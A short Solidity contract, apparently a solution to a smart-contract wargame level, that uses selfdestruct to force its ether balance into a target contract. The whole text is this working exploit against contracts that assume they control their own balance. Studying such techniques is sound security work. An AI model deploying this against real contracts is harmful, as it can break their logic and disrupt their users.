pragma solidity ^0.5.0;

contract ForceAttack {
    constructor() public payable {}

    function attack(address payable _targetAdr) public {
        selfdestruct(_targetAdr);
    }
}
